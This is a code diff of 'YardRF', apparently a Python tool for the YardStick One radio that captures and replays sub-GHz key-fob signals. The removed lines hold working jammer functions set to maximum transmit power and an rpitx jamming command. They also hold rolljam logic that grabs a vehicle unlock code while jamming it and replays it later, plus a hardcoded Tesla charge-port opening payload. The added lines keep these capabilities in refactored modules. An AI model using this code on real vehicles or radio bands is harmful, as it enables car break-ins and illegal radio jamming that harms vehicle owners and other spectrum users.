@@ -1,27 +1,32 @@
+import argparse, time, os
+from core.subghz import yardstick_rx, yardstick_tx, format_signals, tesla_port
+from core.yardstick import configure_stick
+from core.jammy import roll_jam
+from core.interactive import interactive_mode
+from core.output_parser import parse_captured_file, save_signal_output
+from core.interactive import menu
 from rflib import *
-import argparse, bitstring, time
-import subprocess
 
 def main():
     parser = argparse.ArgumentParser(description="YardRF is for your capturing/replaying/rolljam fun")
     parser.add_argument('-f', '--frequency', help='Specify frequency to listen on [default: 433.92MHz (433920000)]', default=433920000, type=int)
-    parser.add_argument('-m', '--modulation', help='Specify modulation type [default: ASK_OOK] example: 2fsk', default='MOD_ASK_OOK')
-    parser.add_argument('-b', '--baudrate', help='Specify sample rate, baudrate [default: 4800] example: 4000', default=4800, type=int)
-    parser.add_argument('-d', '--deviation', help='Specify deviation [default: 0] examples: 2.380371, 47.60742, 29.30', default=0, type=float)
-    parser.add_argument('-s', '--channel_spacing', help='Specify Channel Spacing [Default: 24000]', type=int, default=24000)
-    parser.add_argument('-cb', '--channel_bandwidth', help='Specify channel bandwidth [default: 750000]', default=750000, type=int)
-    parser.add_argument('-bs', '--blocksize', help='Specify capture blocksize ', required=False, type=int)
-    parser.add_argument('-min', '--minRSSI', help='Specify minimum rssi db to accept signal [default: -100]', default=-100, type=int)
-    parser.add_argument('-max', '--maxRSSI', help='Specify maximum rssi db to accept signal [default 40]', default=40, type=int)
+    parser.add_argument('-m', '--modulation', help='Specify modulation type [default: MOD_ASK_OOK] examples: 2FSK/AM270/AM650/FM238/FM476', default='MOD_ASK_OOK')
+    parser.add_argument('-b', '--baudrate', help='Specify sample rate, baudrate [default: 3793] example: 3794', default=3794, type=int)
+    parser.add_argument('-d', '--deviation', help='Specify deviation [default: 0] examples: 23803, 47607, 2930', default=0, type=float)
+    parser.add_argument('-s', '--channel_spacing', help='Specify Channel Spacing, optional [Default: 25000]', type=int, default=25000)
+    parser.add_argument('-cb', '--channel_bandwidth', help='Specify channel bandwidth, optional [default: 0]', default=0, type=int)
+    parser.add_argument('-bs', '--blocksize', help='Specify blocksize for packet capture length [default: 250]', default=0, required=False, type=int)
+    parser.add_argument('-min', '--minRSSI', help='Specify minimum rssi db to accept signal [default: -40]', default=10, type=int)
+    parser.add_argument('-max', '--maxRSSI', help='Specify maximum rssi db to accept signal [default 100]', default=100, type=int)
+    parser.add_argument('-amp', '--amp', help='Enable yardstick one amplifier', default=False, action='store_true')
     parser.add_argument('-n', '--number', help='Specify number of signals to send [Default: 1 transmission]', default=1, type=int)
     parser.add_argument('-o', '--output', help='Specify name of output file to replay captured signals [.cap file extension]', required=False)
     parser.add_argument('-c', '--cap', help='Specify cap file to replay previously captured signals', required=False)
-    parser.add_argument('-l', '--limit', help='Specify capture limit [Default 2]', default=2, required=False, type=int)
-    parser.add_argument('-rj', '--rolljam', help='Enable to send 1st capture, THEN second whenever specified', required=False, action='store_true')
-    parser.add_argument('-a', '--auto', help='Enable to automatically send captures/cap files / Use in conjunction with -rj/--rolljam to send the first signal automatically', action='store_true', required=False)
+    parser.add_argument('-auto', '--auto', help='Enable to automatically send captures/cap files / Use in conjunction with -rj/--rolljam to send the first signal automatically', action='store_true', required=False)
     parser.add_argument('-rpiJ', '--rpitx_jammer', help='Enable jammer with rpitx by specifying rpitx directory [ie. ~/Documents/rpitx]', required=False, type=str)
     parser.add_argument('-ysJ', '--yardstick_jammer', help='Enable jammer with an EXTRA yardstick one', required=False, action='store_true')
-    parser.add_argument('-tesla', '--tesla_port', help='Specify country to send tesla charging port signal example: US, EU/AUS', required=False, type=str)
+    parser.add_argument('-t', '--tesla_port', help='Send tesla charging port signal', required=False, action='store_true')
+    parser.add_argument('-i', '--interactive', help='Enter "Interactive" mode [CMD GUI]', required=False, action='store_true')
 
     args = parser.parse_args()
     baudrate = args.baudrate
@@ -33,213 +38,82 @@ def main():
     bs = args.blocksize
     minRSSI = args.minRSSI
     maxRSSI = args.maxRSSI
+    amp = args.amp
     number = args.number
     output = args.output
     cap = args.cap
-    limit = args.limit # for me to capture my unlock signal, I needed the limit to be 2 minimum.. as the sync and unlock are two different signals?? but it ultimately depended on my blocksize (-bs)
-    rolljam = args.rolljam
     auto = args.auto
     rpitxJ = args.rpitx_jammer
     ysJ = args.yardstick_jammer
-    country = args.tesla_port
+    tesla = args.tesla_port
+    interactive = args.interactive
 
-    if country != None:
-        teslaPortOpener(country, number)
-        print("[*] Tesla Port should be Opened Boss ;)\n")
-        exit(0)
+    d = RfCat(idx=0) # establish permissions with ys1
 
-    ##some sanity check
+    signals = None
+    # interactive mode
+    if interactive:
+        frequency, modulation, deviation, baudrate, bs = interactive_mode(d)
+        configure_stick(d, frequency, modulation, baudrate, deviation, channel_bandwidth, channel_spacing, amp, tesla)
+        yardstick = yardstick_rx()
+        try:
+            signals = yardstick.capture_signals(d, minRSSI, maxRSSI, bs)
+        except Exception as e:
+            pass
+            d.setModeIDLE()
+        option = menu('[*] Save signals to output file: ', ['yes', 'no'])
+        if 'yes' in option:
+            input_file = input("[*] Enter file name [without extension]: ")
+            save_signal_output(input_file, frequency, modulation, deviation, baudrate, bs, signals)
+        print("[*] Formatting each signal captured..\n")
+        payloads = format_signals(signals)
+        print("[*] Transmitting signals captured..\n")
+        yardstick_tx(d, payloads, True, number)
+        d.setModeIDLE()
+        interactive_mode(d)
+
     # no medical frequency ranges please
     if (frequency >= 400000000) and (frequency <= 416000000):
         print("[*] Sorry, Medical frequency ranges are NOT permitted..\n")
         exit(0)
 
-    # config with given settings
-    print("[*] Configuring Settings..\n")
-    d = RfCat(idx=0)
-    d.setFreq(frequency)
-    if modulation=="2FSK" or modulation == "2fsk":
-        d.setMdmModulation(MOD_2FSK) # my vehicle used 2fsk but may be ASKOOK for older cars
-    else:
-        d.setMdmModulation(MOD_ASK_OOK)
-    d.setMdmDRate(baudrate)
-    d.setMdmChanSpc(channel_spacing)
-    d.setMdmChanBW(channel_bandwidth)
-    d.setMdmSyncMode(0)
-    d.setChannel(0)
-    if (deviation != 0):
-        d.setMdmDeviatn(deviation) # for my vehicle, my deviation needed to he 4760, but 2930 is also what I have seen work on other vehicles 
-    d.setAmpMode(1)
-    d.lowball(0) #?? need it to read data??
+    if tesla:
+        print("[*] Popping charging port..\n")
+        configure_stick(d, 315000000, 'MOD_ASK_OOK', 2500, 0, 0, 25000, True, True)
+        tesla_port(d)
+        configure_stick(d, 433920000, 'MOD_ASK_OOK', 2500, 0, 0, 25000, True, True)
+        tesla_port(d)
+        return True
 
-    # read from cap file
+    # read from captured file
     if cap:
-        with open(cap, 'r') as file:
-            signals = [capture.rstrip() for capture in file]
+        frequency, modulation, deviation, baudrate, bs, signals = parse_captured_file(cap)
+    
+    print(f"[*] Configuring yardstick:\n\n[*] Frequency: {frequency} Modulation: {modulation}\n -> Baudrate: {baudrate} Deviation: {deviation}\n")
+    # configure yardstick one with settings
+    configure_stick(d, frequency, modulation, baudrate, deviation, channel_bandwidth, channel_spacing, amp, tesla)
+    # capture signals
+    if signals == None:
+        yardstick = yardstick_rx()
+        signals = yardstick.capture_signals(d, minRSSI, maxRSSI, bs)
+        os.system('clear')
+        d.setModeIDLE()
 
-    else:
-        # a little iffy in terms of jamming so may need to do so manually in another terminal
-        # manual jamming: cd <rpitx directory>
-        # sudo ./sendiq -f <frequency - 80000> -t u8 -s 250000 -i jammer.iq
-        # CTRL-C to stop
-        # start jamming with rpitx if specified
-        if rpitxJ != None:
-            print("[*] Starting Jammer with rpitx\n -  Frequency: " + str(frequency - 80000))
-            proc = rpitxJammer(frequency, rpitxJ)
-            signals = captureSignal(d, minRSSI, maxRSSI, limit, bs, modulation)
-            proc.kill() # stop jammer
-            print("[*] Jammer is done transmitting")
-            # give time to stop pressing fob
-            time.sleep(1)
-        # jam with other yardstick if specified
-        elif ysJ:
-            # start jammer
-            print("[*] Starting jammer with other ys1\n")
-            c = yardJammer(frequency)
-            signals = captureSignal(d, minRSSI, maxRSSI, limit, bs, modulation)
-            print("[*] Stopping Jammer..")
-            c.setModeIDLE()
-            print(" -  Jammer is done transmitting\n")
-        else:
-            # if no roll jamming just capture signal
-            signals = captureSignal(d, minRSSI, maxRSSI, limit, bs, modulation)
-
-    # save captures to a file
+    # if output file is specified, save as filename
     if output:
-        with open(output, 'w') as file:
-            for signal in signals:
-                file.write(signal + '\n')
-
-    d.setModeIDLE() # gotsto coach
+        save_signal_output(output, frequency, modulation, deviation, baudrate, bs, signals)
 
     print("[*] Formatting each signal captured..\n")
-    payloads = formatCapture(d, signals)
-    emptyKey = b'\x00\x00\x00\x00\x00\x00'
-    d.makePktFLEN(len(emptyKey))
-    d.RFxmit(emptyKey) # transmit mode // ys1 bugs out so sometimes so I put it in there
+    payloads = format_signals(signals)
+    print("[*] Transmitting signals captured..\n")
+    yardstick_tx(d, payloads, auto, number)
+    d.setModeIDLE()
+    
+    # jam with rpitx or another yardstick one, and stop after signals are captured
+    if rpitxJ != None or ysJ:
+        signals = roll_jam(rpitxJ, ysJ)
 
-    if rolljam:
-        if not auto:
-            input("[ENTER TO SEND PAYLOAD]")
-        print("[*] Rolljam enabled, so only sending first capture..\n")
-        d.makePktFLEN(len(payloads[0]))
-        d.RFxmit(payloads[0] + emptyKey * number)
-        print("[PACKET SENT] Payload transmittion completed..\n")
-
-        input("[ENTER TO SEND OTHER PAYLOAD]")
-        for x in range(1, len(payloads)):
-            d.makePktFLEN(len(payloads[x]))
-            d.RFxmit(payloads[x] + emptyKey * number)
-            print("[PACKET SENT] Payload transmittion completed..\n")
-    else:
-        if not auto:
-            input("[ENTER TO SEND PAYLOAD]")
-        print("[*] Replaying all captured signals..\n")
-        for x in range(0, len(signals)):
-            d.makePktFLEN(len(payloads[x]))
-            d.RFxmit(payloads[x] + emptyKey * number)
-            print("[PACKET SENT] Payload transmittion completed..\n")
-
-    print("[*] All captures were sent successfully..")
     d.setModeIDLE()
 
-
-def captureSignal(d, minRSSI, maxRSSI, limit, bs, modulation):
-    signals = []
-    x = 0
-    print("[*] Live Packet Capture: \n")
-    while x < limit:
-        try:
-            if bs != None:
-                capture, t = d.RFrecv(timeout=1, blocksize=bs) # when testing on my vehicle, i needed the blocksize to be 475 
-            else:
-                capture, t = d.RFrecv()
-
-            cap = capture.hex()
-
-            strength = int(d.getRSSI().hex(), 16)
-
-            # comment out this line if no captures are being seen
-            if (strength > minRSSI and strength < maxRSSI):
-            # edit count if signal not showing up
-            # try to filter some noise
-                if modulation == 'MOD_ASK_OOK':
-                    if (cap.count('f') < 300):
-                        print(cap)
-                        print('[*] Signal Strength: ' + str(strength))
-                        signals.append(cap)
-                        print('-' * 20)
-                        x += 1
-                else:
-                    if (cap.count('f') < 300) and (cap.count('0') < 300):
-                        print(cap)
-                        print('[*] Signal Strength: ' + str(strength))
-                        signals.append(cap)
-                        print('-' * 20)
-                        x += 1
-
-        except ChipconUsbTimeoutException:
-            pass
-        except KeyboardInterrupt:
-            d.setModeIDLE()
-            break;
-
-    return signals
-
-# jam wit yardstick
-def yardJammer(frequency):
-    c = RfCat(idx=1)
-    c.setMdmModulation(MOD_ASK_OOK) #ask for jammer
-    offset = frequency - 80000
-    if offset < 300000000:
-        offset = frequency + 80000
-    c.setFreq(offset)
-    c.setMdmDRate(baudrate)
-    c.setMdmChanBW(channel_bandwidth)
-    c.setMdmChanSpc(channel_spacing)
-    c.setChannel(0)
-    c.setMaxPower() # max power
-    c.lowball(0)
-    c.setRFRegister(PKTCTRL1, 0xFF)
-    c.setModeTX()
-
-    return c
-
-# jam wit rpitx
-def rpitxJammer(frequency, rpitxJ):
-    # frequency offset of -80000, change as necessary
-    freqOffset = frequency - 80000
-    if freqOffset < 300000000:
-        freqOffset = frequency + 80000
-    # rpitx must be ran with root for me..
-    # Prerequisite: jammer.iq file must be in rpitx directory.. lazy right now 
-    proc = subprocess.Popen(["cd", rpitxJ, "&&", "sudo", "./sendiq", "-s","250000", "-f", str(freqOffset), "-t", "u8", "-i", "jammer.iq"], stdout=open('/dev/null', 'w'), stderr=open('/dev/null', 'a'), shell=True, preexec_fn=os.setpgrp)
-
-    return proc
-
-def formatCapture(d, signals):
-    payloads = []
-    for signal in signals:
-        payload = bitstring.BitArray(hex=signal).tobytes()
-        payloads.append(payload)
-
-    return payloads
-
-# Credits to pickeditmate
-# - https://github.com/pickeditmate
-def teslaPortOpener(country, number):
-    d = RfCat(idx=0)
-    d.setMdmModulation(MOD_ASK_OOK)
-    if country == 'US':
-        d.setFreq(315000000)
-    else:
-        d.setFreq(433920000)
-    d.setMdmDRate(2500)
-#    d.setMaxPower()
-    d.setAmpMode(1)
-    print("[*] Sending Payload\n")
-    for x in range(0, number):
-        d.RFxmit(b'\x15\x55\x55\x51\x59\x4C\xB5\x55\x52\xD5\x4B\x4A\xD3\x4C\xAB\x4B\x15\x94\xCB\x33\x33\x2D\x54\xB4\x56\x9A\x65\x5A\x48\xAC\xC6\x59\x99\x99\x69\xA5\xB2\xB4\xD4\x2A\xD2\x80' * 5)
-    d.setModeIDLE()
-
-main()
+if __name__=='__main__':
+    main()
